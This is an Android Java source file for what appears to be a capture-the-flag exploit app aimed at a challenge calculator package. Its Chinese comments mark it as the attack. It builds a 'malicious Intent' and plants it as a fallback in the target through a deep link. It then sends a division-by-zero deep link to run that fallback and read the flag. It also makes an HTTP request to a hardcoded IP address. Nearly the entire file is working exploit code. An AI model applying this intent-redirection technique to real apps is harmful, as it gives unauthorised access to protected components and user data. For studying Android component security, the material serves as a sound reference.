package com.qwb.pwnqcalc;

import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;
import java.net.URLEncoder;
import java.security.MessageDigest;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    public static final String CHALLENGE_PACKAGE_NAME = "com.qinquang.calc";
    private static final String TAG = "dilrevx";

    private OkHttpClient client = new OkHttpClient();

    private String calculateToken() {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(CHALLENGE_PACKAGE_NAME.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 8; i++) {
                sb.append(String.format("%02x", hash[i]));
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "Token calculation failed: " + e.getMessage());
            return "fallback_token";
        }
    }

    // 主要攻击方法：设置 fallback 并触发
    public void setFallback() {
        try {
            String token = calculateToken();
            Log.d(TAG, "Calculated token: " + token);

            // 步骤1: 构造恶意 Intent 作为 fallback
            Intent maliciousIntent = createMaliciousIntent(token);

            // 步骤2: 通过 deep link 设置 fallback
            setFallbackIntent(maliciousIntent);

            // 步骤3: 延迟后触发除零异常执行 fallback
            new Handler().postDelayed(this::triggerDivisionByZero, 2000);

        } catch (Exception e) {
            Log.e(TAG, "Attack failed: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // 构造恶意 Intent
    private Intent createMaliciousIntent(String token) {
        // 创建一个能读取 flag 的 Intent
        // 这里我们启动自己的 Activity，该 Activity 会在目标应用上下文中执行
        Intent intent = new Intent();
        intent.setClassName(getPackageName(), getPackageName() + ".FlagReceiverActivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        // 添加 BridgeActivity 需要的参数
        ContentValues values = new ContentValues();
        values.put("action", "process");
        values.put("target", "history");
        values.put("timestamp", System.currentTimeMillis());

        intent.putExtra("bridge_values", values);
        intent.putExtra("bridge_token", token);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // FLAG_ACTIVITY_NEW_TASK

        return intent;
    }

    // 通过 deep link 设置 fallback
    private void setFallbackIntent(Intent maliciousIntent) {
        try {
            // 将恶意 Intent 转换为 URI 字符串
            String intentUri = maliciousIntent.toUri(Intent.URI_INTENT_SCHEME);
            Log.d(TAG, "Malicious Intent URI: " + intentUri);

            // 构造 deep link 来设置 fallback
            Uri exploitUri = Uri.parse("somescheme://nothing?expression=" +
                    Uri.encode(intentUri, "UTF-8"));

            Log.d(TAG, "Setting fallback via: " + exploitUri);

            // 发送 deep link

//            Intent launcher = getPackageManager().getLaunchIntentForPackage(CHALLENGE_PACKAGE_NAME);
            Intent launcher = new Intent();
            launcher.setAction(Intent.ACTION_VIEW);
            launcher.setData(exploitUri);
            launcher.setClassName(CHALLENGE_PACKAGE_NAME, CHALLENGE_PACKAGE_NAME+".MainActivity");
            launcher.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launcher);

        } catch (Exception e) {
            Log.e(TAG, "Failed to set fallback: " + e.getMessage());
        }
    }

    // 触发除零异常来执行 fallback
    private void triggerDivisionByZero() {
        try {
            Uri triggerUri = Uri.parse("qiangcalc://calculate?expression=1/0");
            Intent trigger = new Intent(Intent.ACTION_VIEW, triggerUri);
            trigger.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(trigger);
            Log.d(TAG, "Division by zero triggered to execute fallback");
        } catch (Exception e) {
            Log.e(TAG, "Failed to trigger division: " + e.getMessage());
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        setFallback();
        // 原有的 HTTP 请求代码
        Request request = new Request.Builder()
                .url("http://58.246.183.50:37777")
                .build();
        Log.d("dilrevx", "Attempting http request");

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e("HTTP", "请求失败", e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    final String responseBody = response.body().string();
                    runOnUiThread(() -> {
                        Log.d("HTTP", "成功: " + responseBody);
                    });
                }
            }
        });
    }
}